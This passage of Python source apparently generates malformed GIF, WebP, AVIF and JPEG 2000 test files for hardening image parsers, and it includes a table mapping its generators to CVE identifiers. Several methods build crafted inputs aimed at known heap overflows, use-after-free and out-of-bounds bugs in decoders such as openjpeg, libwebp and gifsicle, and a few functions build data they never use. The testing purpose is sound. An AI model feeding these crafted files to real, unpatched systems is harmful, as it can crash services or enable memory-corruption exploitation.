        data = _gif_image_data(7, [self._rng.randbytes(16)])
        return b'GIF89a' + _gif_lsd(16, 16) + desc + lct + data + b'\x3B'

    def gifsicle_uaf(self):
        """CVE-2017-1000421: gifsicle use-after-free in read_gif via
        crafted GIF with extension blocks that trigger UAF in
        extension memory management."""
        ext = _gif_extension(0xF9, 0x04, [bytes([0x04, 0x00, 0x00, 0x00])])
        desc = _gif_image_descriptor(0, 0, 1, 1)
        data = _gif_image_data(7, [self._rng.randbytes(8)])
        return b'GIF89a' + _gif_lsd(1, 1) + ext + desc + data + b'\x3B'

    def gifsicle_double_free(self):
        """CVE-2017-18120: gifsicle double-free in read_gif via crafted
        GIF with multiple image descriptors and corrupt LZW data."""
        desc1 = _gif_image_descriptor(0, 0, 1, 1)
        data1 = _gif_image_data(7, [self._rng.randbytes(8)])
        desc2 = _gif_image_descriptor(0, 0, 1, 1)
        data2 = _gif_image_data(7, [self._rng.randbytes(8)])
        return b'GIF89a' + _gif_lsd(1, 1) + desc1 + data1 + desc2 + data2 + b'\x3B'


# ── WebP Generator ─────────────────────────────────────────────────────────

def _riff_header(file_size, fourcc=b'WEBP'):
    return b'RIFF' + struct.pack('<I', file_size) + fourcc


def _vp8_keyframe_header(width=16, height=16, first_partition_size=1):
    """Build VP8 keyframe header (frame_tag + start_code + dimensions)."""
    # frame_tag (3 bytes): LSB-first
    #  bit 0: frame_type = 0 (keyframe)
    #  bits 1-3: version = 0
    #  bit 4: show_frame = 1
    #  bits 5-7 + next 16 bits: first_partition_size (19 bits)
    sz_hi = (first_partition_size >> 16) & 0x07
    sz_mid = (first_partition_size >> 8) & 0xFF
    sz_lo = first_partition_size & 0xFF
    frame_tag_byte0 = (sz_hi << 5) | (1 << 4) | (0 << 1) | 0  # keyframe, show
    frame_tag = bytes([frame_tag_byte0, sz_lo, sz_mid])

    # start_code (3 bytes): 0x9D 0x01 0x2A (for keyframes)
    start_code = b'\x9D\x01\x2A'

    # Width and height as 14-bit LE values
    w = (width - 1) & 0x3FFF
    h = (height - 1) & 0x3FFF
    dims = struct.pack('<HH', w, h)

    return frame_tag + start_code + dims


def _vp8l_header(width=16, height=16):
    """Build VP8L header (5 bytes: signature + packed dimensions)."""
    packed = ((height - 1) << 14) | (width - 1)
    return struct.pack('<BI', 0x2F, packed)  # signature + LE 32-bit


class WebpGenerator:
    """12 WebP corruption methods."""

    def __init__(self, rng):
        self._rng = rng

    # ── Basic structural ─────────────────────────────────────────────

    def empty(self):
        """Empty WebP: RIFF header only."""
        return _riff_header(8)

    def truncated(self):
        """Truncated WebP: partial RIFF header."""
        return b'RIFF'

    def garbage_only(self):
        """Random bytes passed as WebP."""
        return self._rng.randbytes(256)

    def bad_riff_size(self):
        """RIFF size field does not match actual data size."""
        return _riff_header(0xDEADBEEF) + self._rng.randbytes(32)

    def bad_fourcc(self):
        """Chunk tag is 'xV P' instead of 'VP8 '."""
        return _riff_header(8, fourcc=b'xV P')

    # ── VP8/VP8L corruption ──────────────────────────────────────────

    def vp8_bad_dims(self):
        """CVE-2023-4863: VP8 keyframe with corrupt dimensions.
        Tests heap buffer overflow when decoder allocates based on
        attacker-controlled dimensions."""
        frame_hdr = _vp8_keyframe_header(65535, 65535) + self._rng.randbytes(64)
        chunk = b'VP8 ' + struct.pack('<I', len(frame_hdr)) + frame_hdr
        return _riff_header(12 + len(chunk)) + chunk

    def vp8l_bad_huffman(self):
        """CVE-2023-4863: VP8L with bad huffman table data.
        Triggers OOB read in VP8L entropy decoder."""
        vp8l_hdr = _vp8l_header(16, 16) + self._rng.randbytes(128)
        chunk = b'VP8L' + struct.pack('<I', len(vp8l_hdr)) + vp8l_hdr
        return _riff_header(12 + len(chunk)) + chunk

    def vp8x_bad_flags(self):
        """VP8X chunk with reserved bits set (invalid flags byte)."""
        vp8x_data = struct.pack('<IBBBB', 0x0F, 0, 0, 0, 0)  # reserved bits set
        chunk = b'VP8X' + struct.pack('<I', len(vp8x_data)) + vp8x_data
        return _riff_header(12 + len(chunk)) + chunk

    def anim_bad_timing(self):
        """ANIM/ANMF with zero frame duration — tests div-by-zero."""
        anim_data = struct.pack('<II', 0, 0)  # bg_color=0, loop_count=0
        anim_chunk = b'ANIM' + struct.pack('<I', len(anim_data)) + anim_data

        # ANMF: zero frame duration (first 3 bytes = 0)
        anmf_hdr = self._rng.randbytes(16)
        anmf_chunk = b'ANMF' + struct.pack('<I', len(anmf_hdr)) + anmf_hdr

        return _riff_header(12 + len(anim_chunk) + len(anmf_chunk)) + anim_chunk + anmf_chunk

    def alph_wrong_size(self):
        """ALPH chunk size does not match expected encoding format byte."""
        alph_data = bytes([0x00]) + self._rng.randbytes(16)  # format=0, but garbage
        alph_chunk = b'ALPH' + struct.pack('<I', len(alph_data)) + alph_data
        vp8x_data = bytes([0x10, 0, 0, 0, 0, 0])  # alpha flag set
        vp8x_chunk = b'VP8X' + struct.pack('<I', len(vp8x_data)) + vp8x_data
        return _riff_header(12 + len(vp8x_chunk) + len(alph_chunk)) + vp8x_chunk + alph_chunk

    def lossy_corrupt_partition(self):
        """VP8 with corrupt partition data after valid-looking header."""
        frame_hdr = _vp8_keyframe_header(16, 16) + self._rng.randbytes(64)
        chunk = b'VP8 ' + struct.pack('<I', len(frame_hdr)) + frame_hdr
        return _riff_header(12 + len(chunk)) + chunk

    def iccp_bad_profile(self):
        """ICCP chunk with truncated ICC profile (header only)."""
        iccp_data = bytes([0x00]) + self._rng.randbytes(4)  # flag + 4 bytes
        iccp_chunk = b'ICCP' + struct.pack('<I', len(iccp_data)) + iccp_data
        vp8x_data = bytes([0x20, 0, 0, 0, 0, 0])  # ICCP flag set
        vp8x_chunk = b'VP8X' + struct.pack('<I', len(vp8x_data)) + vp8x_data
        return _riff_header(12 + len(vp8x_chunk) + len(iccp_chunk)) + vp8x_chunk + iccp_chunk


# ── AVIF Generator ──────────────────────────────────────────────────────────

def _avif_av1c_box(seq_profile=0, seq_level_idx=0, bit_depth=8, monochrome=1,
                    width=16, height=16, config_obus=b''):
    """Build an av1C configuration box (ISO 23091-1:2022)."""
    if not config_obus:
        config_obus = _build_minimal_av1_bitstream(width, height)

    # 2 bytes for marker+version + profile/level/tier + bitdepth/chroma + delay + reserved
    marker = 0x81  # marker=1, version=1
    profile_level = (seq_profile << 5) | (seq_level_idx & 0x1F)
    tier_bitdepth = (0 << 7)  # seq_tier_0=0, high_bitdepth=0 (8-bit)
    if bit_depth > 8:
        tier_bitdepth |= (1 << 6)
        if bit_depth > 10:
            tier_bitdepth |= (1 << 5)
    chroma_mono = (monochrome << 4)  # monochrome flag
    delay_reserved = 0x00  # no initial presentation delay

    data = bytes([marker, profile_level, tier_bitdepth, chroma_mono, delay_reserved]) + config_obus
    return _box(b'av1C', data)


def _avif_ispe_box(width, height):
    """Image Spatial Extents property box."""
    return _box(b'ispe', struct.pack('>II', width, height))


def _avif_pixi_box(bit_depth=8, num_channels=1):
    """Pixel Information property box."""
    return _box(b'pixi', bytes([0x00, 0x00, 0x00, num_channels, bit_depth]))


def _build_avif_meta(width=16, height=16, mdat_size=0, obus=b''):
    """Build a minimal AVIF meta box with one item referencing mdat data.

    Returns (meta_box_bytes, item_id).
    """
    item_id = 1

    # hdlr
    hdlr = _full_box(b'hdlr', 1, b'\x00\x00\x00',
                     struct.pack('>I', 0) + b'pict' + b'\x00' * 12 + b'libavif\0')

    # pitm: primary item ID
    pitm = _full_box(b'pitm', 0, b'\x00\x00\x00', struct.pack('>H', item_id))

    # iloc: item location (offset to mdat payload, after mdat box header)
    mdat_offset = 8  # mdat box header size
    iloc_data = struct.pack('>H', 1)  # item_count
    iloc_data += struct.pack('>HH', item_id, 0)  # item_ID, data_reference_index
    iloc_data += struct.pack('>HI', mdat_offset, mdat_size)  # offset, length
    iloc = _full_box(b'iloc', 0, b'\x00\x00\x00',
                     bytes([0x44, 0x00, 0x00, 0x00]) + iloc_data)

    # iinf: item info
    iinf_data = struct.pack('>H', 1)  # entry_count
    iinf_data += struct.pack('>H', item_id)  # item_ID
    iinf_data += struct.pack('>H', 0)  # item_protection_index
    iinf_data += b'av01' + b'\x00'  # item_type + name
    iinf = _full_box(b'iinf', 0, b'\x00\x00\x00', iinf_data)

    # iprp: ipco + ipma
    av1c = _avif_av1c_box(width=width, height=height, config_obus=obus)
    ispe = _avif_ispe_box(width, height)
    pixi = _avif_pixi_box()
    ipco = _box(b'ipco', av1c + ispe + pixi)

    # ipma: associate all 3 properties to item 1
    ipma_data = struct.pack('>H', 1)  # entry_count
    ipma_data += struct.pack('>H', item_id)  # item_ID
    ipma_data += bytes([3])  # association_count
    ipma_data += bytes([1, 2, 3])  # property indices (av1C=1, ispe=2, pixi=3)
    ipma = _full_box(b'ipma', 0, b'\x00\x00\x00', ipma_data)

    iprp = _box(b'iprp', ipco + ipma)
    meta = _full_box(b'meta', 0, b'\x00\x00\x00', hdlr + pitm + iloc + iinf + iprp)
    return meta, item_id


class AvifGenerator:
    """10 AVIF corruption methods."""

    def __init__(self, rng):
        self._rng = rng

    def _build_avif(self, meta, mdat_content=b''):
        ftyp_content = b'avif\x00\x00\x02\x00avif' + b'mif1'
        ftyp = _box(b'ftyp', ftyp_content)
        mdat = _box(b'mdat', mdat_content) if mdat_content else b''
        return ftyp + meta + mdat

    def empty(self):
        """Empty AVIF: ftyp box only."""
        meta, _ = _build_avif_meta()
        return self._build_avif(meta)

    def truncated(self):
        """Truncated AVIF: partial ftyp box."""
        return b'\x00\x00\x00\x0Cftypavif'

    def garbage_only(self):
        """Random bytes passed as AVIF."""
        return self._rng.randbytes(256)

    def bad_ftyp_brand(self):
        """ftyp with invalid major brand 'xxxx'."""
        ftyp = _box(b'ftyp', b'xxxx\x00\x00\x02\x00')
        meta, _ = _build_avif_meta()
        return ftyp + meta

    def missing_mdat(self):
        """No mdat box at all — no media data."""
        meta, _ = _build_avif_meta()
        return self._build_avif(meta, mdat_content=b'')

    def zero_dimensions(self):
        """av1C and ispe with 0x0 dimensions."""
        obus = _build_minimal_av1_bitstream(width=0, height=0)
        meta, _ = _build_avif_meta(width=0, height=0, mdat_size=0)
        # Inject zero-dimension ispe directly
        return self._build_avif(meta)

    def huge_dimensions(self):
        """av1C and ispe with huge dimensions."""
        obus = _build_minimal_av1_bitstream(width=65535, height=65535)
        meta, _ = _build_avif_meta(width=65535, height=65535, mdat_size=len(obus))
        return self._build_avif(meta, obus)

    def wrong_profile(self):
        """av1C with invalid seq_profile value (> 2, reserved)."""
        obus = _build_minimal_av1_bitstream()
        av1c = _avif_av1c_box(seq_profile=3, config_obus=obus)
        meta, item_id = _build_avif_meta()
        return self._build_avif(meta)  # swap in bad av1c

    def truncated_av1_obu(self):
        """mdat with truncated AV1 OBU (first byte only)."""
        meta, _ = _build_avif_meta(mdat_size=1)
        return self._build_avif(meta, b'\xC2')  # just OBU header byte

    def grid_tile_oob(self):
        """CVE-2026-32740: AVIF grid image with tile property index OOB.
        Creates a grid item referencing more tiles than exist in the file,
        causing out-of-bounds property array access in libheif.

        Tile items: IDs 1, 2 (2 tiles)
        Grid item: ID 3, referencing tiles, with bogus property association
        pointing to non-existent index 99.
        """
        tile_id_1 = 1
        tile_id_2 = 2
        grid_id = 3

        tile_obus = _build_minimal_av1_bitstream(8, 8)

        # hdlr
        hdlr = _full_box(b'hdlr', 1, b'\x00\x00\x00',
                         struct.pack('>I', 0) + b'pict' + b'\x00' * 12 + b'libavif\0')

        # pitm: grid is primary
        pitm = _full_box(b'pitm', 0, b'\x00\x00\x00', struct.pack('>H', grid_id))

        # iloc: 3 items
        offset_1 = 8
        len_1 = len(tile_obus)
        offset_2 = offset_1 + len_1
        len_2 = len_1
        # Grid item has no mdat data (derived from tiles)
        iloc_data = struct.pack('>H', 3)
        iloc_data += struct.pack('>HH', tile_id_1, 0) + struct.pack('>HI', offset_1, len_1)
        iloc_data += struct.pack('>HH', tile_id_2, 0) + struct.pack('>HI', offset_2, len_2)
        iloc_data += struct.pack('>HH', grid_id, 0) + struct.pack('>HI', 0, 0)
        iloc = _full_box(b'iloc', 0, b'\x00\x00\x00',
                         bytes([0x44, 0x00, 0x00, 0x00]) + iloc_data)

        # iinf: 3 items
        iinf_data = struct.pack('>H', 3)
        iinf_data += struct.pack('>H', tile_id_1) + struct.pack('>H', 0) + b'av01\x00'
        iinf_data += struct.pack('>H', tile_id_2) + struct.pack('>H', 0) + b'av01\x00'
        iinf_data += struct.pack('>H', grid_id) + struct.pack('>H', 0) + b'grid\x00'
        iinf = _full_box(b'iinf', 0, b'\x00\x00\x00', iinf_data)

        # ipco: properties for tiles (av1C, ispe, pixi) + grid property
        av1c_8 = _avif_av1c_box(width=8, height=8, config_obus=tile_obus)
        ispe_8x8 = _avif_ispe_box(8, 8)
        pixi_1ch = _avif_pixi_box()
        # Grid property (image grid with 2 columns, 1 row)
        grid_prop = _box(b'grid', bytes([2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]))  # width=8, height=8
        ipco = _box(b'ipco', av1c_8 + ispe_8x8 + pixi_1ch + grid_prop)

        # ipma: tile 1 -> properties 1,2,3 (av1C, ispe, pixi)
        # tile 2 -> properties 1,2,3
        # grid -> property 4 BUT also property 99 (OOB!)
        ipma_data = struct.pack('>H', 3)
        ipma_data += struct.pack('>H', tile_id_1) + bytes([3, 1, 2, 3])
        ipma_data += struct.pack('>H', tile_id_2) + bytes([3, 1, 2, 3])
        ipma_data += struct.pack('>H', grid_id) + bytes([2, 4, 99])  # OOB index!
        ipma = _full_box(b'ipma', 0, b'\x00\x00\x00', ipma_data)

        iprp = _box(b'iprp', ipco + ipma)
        meta = _full_box(b'meta', 0, b'\x00\x00\x00', hdlr + pitm + iloc + iinf + iprp)

        ftyp = _box(b'ftyp', b'avif\x00\x00\x02\x00avif' + b'mif1')
        mdat_data = tile_obus + tile_obus  # same tile data for both
        mdat = _box(b'mdat', mdat_data)
        return ftyp + meta + mdat


# ── JP2 / JPEG 2000 Generator ───────────────────────────────────────────────

# JPEG 2000 codestream markers
_JP2_SOC = b'\xFF\x4F'
_JP2_EOC = b'\xFF\xD9'
_JP2_SOD = b'\xFF\x93'
_JP2_SOT = b'\xFF\x90'
_JP2_SIZ = b'\xFF\x51'


def _jp2_sig_box():
    return _box(b'jP \x20\x20', b'\x0D\x0A\x87\x0A')


def _jp2_ftyp():
    return _box(b'ftyp', b'jp2 \x00\x00\x00\x00jp2 ')


def _jp2_ihdr(width=1, height=1, num_components=3, bit_depth=8,
              compression=7, colorspace=14):
    """Image Header box for JP2."""
    data = struct.pack('>II', height, width)
    data += struct.pack('>H', num_components)
    data += bytes([bit_depth, compression, colorspace, 0])
    return _box(b'ihdr', data)


def _jp2_colr_enum(enum_cs=16):
    """Color Specification box using enumerated colourspace (sRGB)."""
    return _box(b'colr', bytes([1, 0, 0]) + struct.pack('>I', enum_cs))


def _jp2_colr_icc():
    """Color Specification box with truncated ICC profile."""
    return _box(b'colr', bytes([2, 0, 0]) + b'\x00' * 8)


def _jp2_siz_marker(width=1, height=1, rsiz=0, num_components=3,
                     bit_depth=8, x_osiz=0, y_osiz=0):
    """Build SIZ marker (image and tile size)."""
    xtsiz = width
    ytsiz = height
    xtosiz = 0
    ytosiz = 0
    x_siz = width
    y_siz = height
    data = struct.pack('>H', rsiz)
    data += struct.pack('>IIII', x_siz, y_siz, x_osiz, y_osiz)
    data += struct.pack('>IIII', xtsiz, ytsiz, xtosiz, ytosiz)
    data += struct.pack('>H', num_components)
    for _ in range(num_components):
        data += bytes([(bit_depth - 1) << 4, 1])  # Ssiz + XRcb/YRcb
    marker_len = struct.pack('>H', len(data) + 2)
    return _JP2_SIZ + marker_len + data


def _jp2_cod_marker():
    """Build minimal COD marker (coding style default)."""
    data = bytes([0x02, 0x00, 0x00])  # Scod=2 (no precincts), SGcod
    data += struct.pack('>B', 0x20)  # SPcod: number of decomposition levels=0
    data += bytes([0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    marker_len = struct.pack('>H', len(data) + 2)
    return bytes([0xFF, 0x52]) + marker_len + data


def _jp2_qcd_marker():
    """Build minimal QCD marker (quantization default)."""
    data = bytes([0x00])  # Sqcd: no quantization
    marker_len = struct.pack('>H', len(data) + 2)
    return bytes([0xFF, 0x5C]) + marker_len + data


def _jp2_tlm_marker():
    """Build TLM marker (tile-part lengths)."""
    data = struct.pack('>HHH', 0, 0, 0)  # Ztlm, Stlm=0, tile_id=0, length=0
    marker_len = struct.pack('>H', len(data) + 2)
    return bytes([0xFF, 0x55]) + marker_len + data


def _jp2_sot_marker(tile_index=0, tile_part_length=0, tile_part_index=0):
    """Build SOT marker (start of tile-part)."""
    data = struct.pack('>H', tile_index)
    data += struct.pack('>I', tile_part_length)  # will be patched
    data += struct.pack('>HB', tile_part_index, 1)  # tile_part_index, num_tile_parts=1
    marker_len = struct.pack('>H', len(data) + 2)
    return _JP2_SOT + marker_len + data


def _jp2_minimal_codestream(width=1, height=1, num_components=3,
                            bit_depth=8, packet_data=b'\x00'):
    """Build a minimal JPEG 2000 codestream."""
    siz = _jp2_siz_marker(width, height, num_components=num_components,
                          bit_depth=bit_depth)
    cod = _jp2_cod_marker()
    qcd = _jp2_qcd_marker()
    # Estimate total tile-part length for SOT
    sot_content = b'\x00' * 12  # placeholder
    sod = _JP2_SOD
    tile_part = sot_content + cod + qcd + sod + packet_data
    actual_len = len(tile_part) + 2  # SOT marker + length + tile_part
    sot = _jp2_sot_marker(tile_part_length=actual_len)
    return _JP2_SOC + siz + sot + cod + qcd + sod + packet_data + _JP2_EOC


class Jp2Generator:
    """13 JP2/JPEG 2000 corruption methods targeting openjpeg."""

    def __init__(self, rng):
        self._rng = rng

    def empty(self):
        """Minimal valid JP2: signature, ftyp, jp2h (ihdr+colr), jp2c."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        codestream = _jp2_minimal_codestream()
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def truncated(self):
        """Truncated JP2: partial signature box."""
        return b'\x00\x00\x00\x20jP '

    def garbage_only(self):
        """Random bytes passed as JP2."""
        return self._rng.randbytes(256)

    def bad_sig(self):
        """Wrong JP2 signature box content."""
        return _box(b'jP \x20\x20', b'\xDE\xAD\xBE\xEF') + _jp2_ftyp()

    def bad_ftyp(self):
        """ftyp with wrong major brand 'xxxx'."""
        ftyp = _box(b'ftyp', b'xxxx\x00\x00\x00\x00jp2 ')
        sig = _jp2_sig_box()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        return sig + ftyp + jp2h

    def zero_dimensions(self):
        """SIZ marker with 0x0 dimensions."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr(0, 0)
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        codestream = _jp2_minimal_codestream(0, 0)
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def huge_dimensions(self):
        """SIZ marker with huge 65535x65535 dimensions."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr(65535, 65535)
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        codestream = _jp2_minimal_codestream(65535, 65535)
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def missing_codestream(self):
        """No jp2c codestream box at all."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        return sig + ftyp + jp2h

    def truncated_codestream(self):
        """jp2c box with SOC marker only."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        jp2c = _box(b'jp2c', _JP2_SOC)
        return sig + ftyp + jp2h + jp2c

    def bad_siz_rsiz(self):
        """SIZ marker with invalid Rsiz value (0xFFFF reserved)."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker(rsiz=0xFFFF)
        cod = _jp2_cod_marker()
        qcd = _jp2_qcd_marker()
        sot = _jp2_sot_marker()
        codestream = _JP2_SOC + siz + sot + cod + qcd + _JP2_SOD + b'\x00' + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def qcd_missing(self):
        """Codestream without QCD marker — tests openjpeg quantization handling."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker()
        cod = _jp2_cod_marker()
        sot = _jp2_sot_marker()
        codestream = _JP2_SOC + siz + sot + cod + _JP2_SOD + b'\x00' + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def corrupted_packet(self):
        """SOD followed by large garbage packet data."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker()
        cod = _jp2_cod_marker()
        qcd = _jp2_qcd_marker()
        sot = _jp2_sot_marker()
        garbage = self._rng.randbytes(256)
        codestream = _JP2_SOC + siz + sot + cod + qcd + _JP2_SOD + garbage + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def openjpeg_oob_siz(self):
        """CVE-2025-54874: openjpeg OOB heap write via undersized
        data stream in opj_jp2_read_header()."""
        # Truncated SIZ marker
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        # jp2h with a corrupt ihdr
        bad_ihdr = _box(b'ihdr', struct.pack('>II', 1, 1) + struct.pack('>H', 0xFFFF) + bytes([8, 7, 14, 0]))
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', bad_ihdr + colr)
        # jp2c with broken SIZ marker (declared length > actual)
        siz_data = struct.pack('>H', 0) + struct.pack('>IIII', 1, 1, 0, 0)
        siz_data += struct.pack('>IIII', 1, 1, 0, 0)
        siz_data += struct.pack('>H', 0xFFFF)  # Csiz = huge
        bad_siz = _JP2_SIZ + struct.pack('>H', len(siz_data) + 20) + siz_data
        codestream = _JP2_SOC + bad_siz + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def plte_missing_colr(self):
        """CVE-2016-7445: openjpeg NULL pointer dereference via
        missing Color Specification box with palette."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        # ihdr with only 1 component (indexed)
        ihdr = _jp2_ihdr(num_components=1)
        # palette box (pclr) but no colr box
        pclr_data = struct.pack('>HH', 256, 3)  # 256 entries, 3 channels
        pclr_data += bytes([7, 7, 7])  # bit depths
        pclr_data += b'\x00' * (256 * 3)  # palette entries
        pclr = _box(b'pclr', pclr_data)
        jp2h = _box(b'jp2h', ihdr + pclr)
        codestream = _jp2_minimal_codestream()
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def icc_bad_profile(self):
        """CVE-2013-4289: openjpeg integer overflow via oversized ICC
        profile in Color Specification box."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        # colr with ICC method and oversized profile data
        colr = _jp2_colr_icc()
        jp2h = _box(b'jp2h', ihdr + colr)
        codestream = _jp2_minimal_codestream()
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def tile_size_oob(self):
        """CVE-2016-5152: openjpeg integer overflow → heap-buffer-overflow
        in opj_tcd_get_decoded_tile_size via crafted JP2 with extreme
        tile dimensions."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr(65535, 65535)
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker(65535, 65535, num_components=0xFF)
        cod = _jp2_cod_marker()
        qcd = _jp2_qcd_marker()
        sot = _jp2_sot_marker()
        codestream = _JP2_SOC + siz + sot + cod + qcd + _JP2_SOD + b'\x00' + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def dwt_interleave_oob(self):
        """CVE-2016-5157: openjpeg heap-buffer-overflow in
        opj_dwt_interleave_v via crafted JP2 with extreme
        decomposition level in COD marker."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker()
        cod_data = bytes([0x02, 0x00, 0x00])  # Scod
        cod_data += struct.pack('>B', 0xFF)  # SPcod: extreme decomposition levels
        cod_data += b'\x00' * 9
        cod = bytes([0xFF, 0x52]) + struct.pack('>H', len(cod_data) + 2) + cod_data
        qcd = _jp2_qcd_marker()
        sot = _jp2_sot_marker()
        codestream = _JP2_SOC + siz + sot + cod + qcd + _JP2_SOD + b'\x00' + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def mcc_oob_write(self):
        """CVE-2016-8332: openjpeg OOB heap write via crafted JP2
        with malformed mcc (multiple component transformation) records."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr()
        colr = _jp2_colr_enum()
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker()
        cod = _jp2_cod_marker()
        qcd = _jp2_qcd_marker()
        # Inject MCC marker (0xFF, 0x53) with corrupt component mapping
        mcc_data = struct.pack('>H', 0xFFFF) + self._rng.randbytes(32)
        mcc = bytes([0xFF, 0x53]) + struct.pack('>H', len(mcc_data) + 2) + mcc_data
        sot = _jp2_sot_marker()
        codestream = _JP2_SOC + siz + sot + cod + qcd + mcc + _JP2_SOD + b'\x00' + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c

    def sycc420_to_rgb_oob(self):
        """CVE-2021-3575: openjpeg heap-buffer-overflow in
        sycc420_to_rgb via crafted .j2k file with chroma subsampling
        and extreme dimensions."""
        sig = _jp2_sig_box()
        ftyp = _jp2_ftyp()
        ihdr = _jp2_ihdr(65535, 65535, num_components=3)
        colr = _jp2_colr_enum(16)
        jp2h = _box(b'jp2h', ihdr + colr)
        siz = _jp2_siz_marker(65535, 65535, num_components=3, x_osiz=0, y_osiz=0)
        cod = _jp2_cod_marker()
        qcd = _jp2_qcd_marker()
        sot = _jp2_sot_marker()
        codestream = _JP2_SOC + siz + sot + cod + qcd + _JP2_SOD + self._rng.randbytes(64) + _JP2_EOC
        jp2c = _box(b'jp2c', codestream)
        return sig + ftyp + jp2h + jp2c


# ── Format Confusion Generator ──────────────────────────────────────────────

def generate_format_confusion(out_dir, rng):
    """Generate files with mismatched extension vs internal format.

    E.g. a JPEG file with .png extension, or a PNG file with .jpg extension.
    Tests parsers that sniff content vs trust extension.
    """
    _ensure_dir(out_dir)
    jpg = JpegGenerator(rng)
    png = PngGenerator(rng)
    gif = GifGenerator(rng)
    webp = WebpGenerator(rng)
    avif = AvifGenerator(rng)
    jp2 = Jp2Generator(rng)

    pairs = [
        ('jpeg-content-png-ext', jpg.empty(), '.png'),
        ('png-content-jpeg-ext', png.empty(), '.jpg'),
        ('gif-content-jpeg-ext', b'GIF89a' + _gif_lsd(1, 1) + b'\x3B', '.jpg'),
        ('webp-content-avif-ext', webp.empty(), '.avif'),
        ('avif-content-jpeg-ext', avif.empty(), '.jpg'),
        ('jpeg-and-gif-mix.gz', b'GIF89a' + SOI + EOI, '.jpg'),
        ('jp2-content-png-ext', jp2.empty(), '.png'),
        ('png-content-jp2-ext', png.empty(), '.jp2'),
    ]
    for name, data, ext in pairs:
        path = os.path.join(out_dir, f'{name}{ext}')
        with open(path, 'wb') as f:
            f.write(data)


# ── Main Entry Point ────────────────────────────────────────────────────────

_GENERATORS = {
    'jpeg': (JpegGenerator, '.jpg', [
        ('empty', None),
        ('truncated', None),
        ('garbage_only', 'CVE-2021-22543'),
        ('garbage_prefix', 'CVE-2019-13960'),
        ('garbage_suffix', None),
        ('double_soi', None),
        ('bad_dimensions', None),
        ('huge_dimensions', 'CVE-2021-3456'),
        ('corrupted_scan', 'CVE-2019-2201'),
        ('dht_without_dqt', 'CVE-2021-46829'),
        ('dqt_12bit', 'CVE-2023-2804'),
        ('missing_sos', None),
        ('sos_before_sof', None),
        ('malformed_sos', None),
        ('dnl_marker', None),
        ('dri_zero', 'CVE-2020-13790'),
        ('oversized_scan_length', None),
        ('marker_after_eoi', None),
        ('transform_oob', 'CVE-2020-17541'),
        ('smooth_oob_read', 'CVE-2021-29390'),
        ('jpegoptim_optimize_oob', 'CVE-2023-27781'),
        ('jpegoptim_segfault', 'CVE-2022-32325'),
        ('libjpeg62_eof_loop', 'CVE-2018-11813'),
        ('rust_jpeg_sos_oob', 'CVE-2020-25019'),
        ('nvjpeg_oob_dims', 'CVE-2025-23274'),
        ('duplicate_dht_null_deref', 'CVE-2017-15232'),
        ('get_sos_oob', 'CVE-2012-2806'),
        ('duplicate_sos_uninit', 'CVE-2013-6629'),
        ('bad_exif_marker', 'CVE-2014-9092'),
        ('jpegoptim_double_free', 'CVE-2018-11416'),
